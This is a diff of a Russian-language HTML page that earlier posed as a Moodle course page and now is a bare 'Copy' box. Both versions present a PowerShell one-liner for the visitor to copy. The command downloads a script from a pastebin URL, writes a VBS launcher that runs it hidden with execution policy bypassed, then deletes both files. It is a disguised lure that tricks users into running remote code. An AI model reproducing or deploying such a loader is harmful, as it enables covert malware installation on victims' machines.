@@ -2,180 +2,47 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<title></title>
+<title>Copy</title>
 <style>
   body {
     margin: 0;
-    background: #f4f6f8;
+    background: #f3f3f3;
     font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-    color: #1f2937;
+    padding: 24px;
   }
 
-  .layout {
-    display: grid;
-    grid-template-columns: 260px 1fr;
-    min-height: 100vh;
-  }
-
-  /* Sidebar */
-  .sidebar {
-    background: #ffffff;
-    border-right: 1px solid #e5e7eb;
-    padding: 16px 14px;
-  }
-
-  .logo {
-    font-weight: 700;
-    font-size: 18px;
-    margin-bottom: 18px;
-    color: #2563eb;
-  }
-
-  .course {
-    padding: 10px 12px;
-    border-radius: 8px;
-    margin-bottom: 6px;
-    cursor: default;
-    color: #374151;
-  }
-
-  .course.active {
-    background: #e0e7ff;
-    color: #1e40af;
-    font-weight: 600;
-  }
-
-  .course:not(.active):hover {
-    background: #f3f4f6;
-  }
-
-  /* Main area */
-  .main {
-    padding: 28px;
-  }
-
-  .card {
+  .box {
     background: white;
-    border: 1px solid #e5e7eb;
-    border-radius: 12px;
-    padding: 18px 18px 16px;
-    box-shadow: 0 6px 20px rgba(0,0,0,.05);
-    max-width: 1100px;
-  }
-
-  .top {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 14px;
-  }
-
-  .title {
-    font-weight: 700;
-    font-size: 18px;
-  }
-
-  .hint {
-    font-size: 13px;
-    color: #6b7280;
-    margin-top: 2px;
-  }
-
-  button {
-    background: #2563eb;
-    border: 0;
-    color: white;
-    padding: 10px 14px;
-    border-radius: 8px;
-    font-weight: 600;
-    cursor: pointer;
-  }
-
-  button:hover {
-    background: #1e40af;
-  }
-
-  .status {
-    font-size: 13px;
-    color: #6b7280;
-    min-width: 120px;
-    text-align: right;
+    border: 1px solid #cfcfcf;
+    border-radius: 6px;
+    padding: 14px;
+    box-shadow: inset 0 0 0 1px #e5e5e5;
+    display: inline-block;
+    max-width: 100%;
   }
 
   pre {
-    background: #f9fafb;
-    border: 1px solid #e5e7eb;
-    border-radius: 8px;
-    padding: 14px;
     margin: 0;
-    white-space: pre-wrap;
-    word-break: break-word;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-family: Consolas, Menlo, Monaco, monospace;
     font-size: 14px;
     line-height: 1.45;
-    max-height: 70vh;
-    overflow: auto;
+    white-space: pre-wrap;
+    word-break: break-word;
     user-select: text;
   }
 </style>
 </head>
 <body>
 
-<div class="layout">
-  <!-- Sidebar -->
-  <div class="sidebar">
-    <div class="logo">Moodle</div>
-
-    <div class="course active">Текущий курс</div>
-    <div class="course">Сетевые технологии</div>
-    <div class="course">Cloud Computing</div>
-    <div class="course">Программирование</div>
-    <div class="course">Базы данных</div>
-    <div class="course">Безопасность</div>
-  </div>
-
-  <!-- Main -->
-  <div class="main">
-    <div class="card">
-      <div class="top">
-        <div>
-          <div class="title"></div>
-          <div class="hint">123</div>
-        </div>
-        <div style="display:flex;gap:10px;align-items:center;">
-          <button id="copy">123</button>
-          <div class="status" id="status"></div>
-        </div>
-      </div>
-
-      <pre id="content">
-$url = "https://pastebin.com/raw/K9J6wYsP"; $tmpFile = "$env:TEMP\tmp_$(Get-Random).ps1"; Invoke-WebRequest -Uri $url -OutFile $tmpFile; $vbsFile = "$env:TEMP\run_$(Get-Random).vbs"; @"
-CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$tmpFile""", 0, False
-"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue</pre>
-    </div>
-  </div>
+<div class="box">
+  <pre id="text"></pre>
 </div>
 
 <script>
-  const content = document.getElementById("content");
-  const status = document.getElementById("status");
-
-  function copyText() {
-    navigator.clipboard.writeText(content.innerText).then(() => {
-      status.textContent = "Скопировано";
-      setTimeout(() => status.textContent = "", 2000);
-    });
-  }
-
-  document.getElementById("copy").addEventListener("click", copyText);
-
-  content.addEventListener("click", () => {
-    const range = document.createRange();
-    range.selectNodeContents(content);
-    const sel = window.getSelection();
-    sel.removeAllRanges();
-    sel.addRange(range);
-  });
+  document.getElementById("text").textContent =
+`$url = "https://pastebin.com/raw/K9J6wYsP"; $tmpFile = "$env:TEMP\tmp_$(Get-Random).ps1"; Invoke-WebRequest -Uri $url -OutFile $tmpFile; $vbsFile = "$env:TEMP\run_$(Get-Random).vbs"; @"
+CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$tmpFile""", 0, False
+"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue`;
 </script>
 
 </body>
